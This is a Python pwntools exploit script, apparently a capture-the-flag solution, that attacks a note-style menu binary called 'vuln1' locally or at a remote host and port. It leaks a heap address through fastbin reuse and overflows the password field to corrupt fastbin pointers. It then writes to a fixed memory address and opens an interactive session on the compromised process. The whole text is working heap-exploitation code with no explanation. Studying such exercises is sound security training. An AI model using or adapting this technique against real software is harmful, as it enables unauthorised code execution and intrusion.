from pwn import *
import sys

if len(sys.argv)>1:
    r=remote(HOST,PORT)
else:
    r=process('./vuln1')

def add(size,passwd=''):
    r.sendlineafter(">>> ",'1')
    r.sendlineafter("Enter password\n",passwd)
    r.sendlineafter("Enter size\n",str(size))

def edit(idx,data,passwd=''):
    r.sendlineafter(">>> ",'2')
    r.sendlineafter("Enter password\n",passwd)
    r.sendlineafter("Enter index\n",str(idx))
    r.sendline(data)

def delete(idx,passwd=''):
    r.sendlineafter(">>> ",'3')
    r.sendlineafter("Enter password\n",passwd)
    r.sendlineafter("Enter index\n",str(idx))

def view(idx,passwd=''):
    r.sendlineafter(">>> ",'4')
    r.sendlineafter("Enter password\n",passwd)
    r.sendlineafter("Enter index\n",str(idx))

def getleak():
    add(90) # 0
    add(90) # 1
    delete(1) # fastbin -> 1 -> !!!
    delete(0) # fastbin -> 0 -> 1 -> !!!
    add(90) # 0 ; fastbin -> 1 -> !!!
    view(0)
    heap=u64(r.recvuntil('\n').strip('\n').ljust(8,'\x00'))-0x70-0xc0
    log.info("heap @ "+hex(heap))
    return heap

def exploit(heap):
    # add(90) # 1 ; fastbin -> !!!
    # add(90) # 2 ; fastbin -> !!!
    # delete(1) # fastbin -> 1 -> !!!
    # delete(2) # fastbin -> 2 -> 1
    # add(112) # n1
    # add(112) # n2
    payload='A'*(0x400-16)+p64(heap+0x10)
    #gdb.attach(r,'''b*0x400b66\nb*0x400d39''')
    delete(15,payload) # fastbin -> 1 -> 2 -> 1 -> !!!
    #r.interactivep()
    add(80) # 3 ; fastbin -> 2 -> 1 -> !!!
    edit(0,p64(0x602060))
    edit(0,p64(0))
    r.sendlineafter('>>> ','1')
    r.sendline('')
    r.interactive()
    # add(90) # 4 ; fastbin -> 1 -> arbit -> !!!
    # add(90) # 5 ; fastbin -> arbit -> !!!
    # add(90) # 6 ; arbit
    # #gdb.attach(r,'''b*0x0000000000400b2a''')
    # payload='wwwwwwww'
    # edit(6,payload)
    # edit(1,payload)

if __name__=='__main__':
    heap=getleak()
    exploit(heap)
    r.interactive()
